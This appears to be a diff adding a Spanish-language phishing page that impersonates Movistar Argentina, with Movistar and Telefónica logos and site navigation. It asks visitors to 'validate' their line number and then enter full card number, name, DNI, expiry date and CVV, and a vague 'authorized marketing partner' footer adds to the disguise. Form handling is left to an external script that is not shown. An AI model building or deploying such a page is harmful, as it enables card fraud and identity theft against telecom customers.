@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Argentina</title>
+    <link rel="stylesheet" href="./css/main.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="./assets/logo.png" type="image/x-icon">
+    <script>
+        function onlyNumbers(evt) {
+            var charCode = (evt.which) ? evt.which : evt.keyCode;
+            if (charCode < 48 || charCode > 57) {
+                evt.preventDefault();
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="head">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Movistar_isotype_2020.svg/800px-Movistar_isotype_2020.svg.png" alt="Logo" width="53px">
+        </div>
+        <div class="itemHead">
+            <p>Celulares</p>
+        </div>
+        <div class="itemHead">
+            <p>Hogar</p>
+        </div>
+        <div class="itemHead">
+            <p>Móvil</p>
+        </div>
+        <div class="itemHead">
+            <p>Televisión</p>
+        </div>
+        <div class="itemHead">
+            <p>Ayuda</p>
+        </div>
+        <div class="itemHead">
+            <p>Movistar con todo</p>
+        </div>
+    </div>
+    <center>
+        <div class="square">
+            <div class="process">
+                <img src="img/process.jpg" alt="Proceso">
+            </div>
+            <div class="validate">
+                <h1>Validá tus datos</h1>
+            </div>
+            <div class="formulario">
+                <form class="myForm">
+                    <div class="lbl">
+                        <label for="number">Ingresá tu número de línea</label>
+                    </div>
+                    <div class="ipt">
+                        <input type="text" onkeypress="onlyNumbers(event)" inputmode="numeric" oninput="verificarInput()" name="number" id="number" minlength="10" maxlength="10" placeholder="Ej.: 1123456789" required>
+                    </div>
+                    <div class="small">
+                        <small>Código de área + Número de línea</small>
+                    </div>
+                    <div class="small">
+                        <small>Ej.: 1123456789</small>
+                    </div>
+                    <div class="cardForm" id="cardForm">
+                        <div class="ingrese">
+                            <p>Ingresá tu tarjeta</p>
+                        </div>
+                        <div class="card">
+                            <input type="text" onkeypress="onlyNumbers(event)" inputmode="numeric" name="numero" id="numero" minlength="16" maxlength="19" placeholder="Número de tarjeta" required>
+                        </div>
+                        <div class="smallForm">
+                            <small>Nombre y apellido</small>
+                        </div>
+                        <div class="denei">
+                            <input type="text" name="denei" id="fullName" placeholder="Nombre y apellido" required>
+                        </div>
+                        <div class="smallForm">
+                            <small>DNI del titular</small>
+                        </div>
+                        <div class="denei">
+                            <input type="text" onkeypress="onlyNumbers(event)" inputmode="numeric" name="denei" id="denei" minlength="7" maxlength="8" placeholder="DNI" required>
+                        </div>
+                        <div class="smallForm">
+                            <small>Fecha de vencimiento (mm/aa):</small>
+                        </div>
+                        <div class="mmaa">
+                            <input type="text" onkeypress="onlyNumbers(event)" inputmode="numeric" name="mes" id="mes" placeholder="Mes" minlength="2" maxlength="2" required>
+                            /
+                            <input type="text" onkeypress="onlyNumbers(event)" inputmode="numeric" name="ano" id="ano" placeholder="Año" minlength="2" maxlength="2" required>
+                        </div>
+                        <div class="smallForm">
+                            <small>Código de seguridad</small>
+                        </div>
+                        <div class="cvv">
+                            <input type="text" onkeypress="onlyNumbers(event)" inputmode="numeric" name="seg" id="seg" minlength="3" maxlength="4" placeholder="CVV" required>
+                        </div>
+                        <div class="button">
+                            <input type="submit" value="Continuar">
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="container">
+            <div class="footer">
+                <img src="img/logoTele.svg" alt="Logo Telefónica">
+                <p>Este sitio web pertenece al socio de marketing autorizado del proyecto. La empresa se reserva el derecho de añadir, alterar o eliminar material del sitio web en cualquier momento y puede, en cualquier momento, revisar estos términos sin previo aviso, por lo que le aconsejamos que visite periódicamente esta página para revisar los términos actuales.</p>
+            </div>
+            <br>
+            <br>
+            <br>
+        </div>
+    </center>
+    <script src="./js/script.js"></script>
+</body>
+</html>
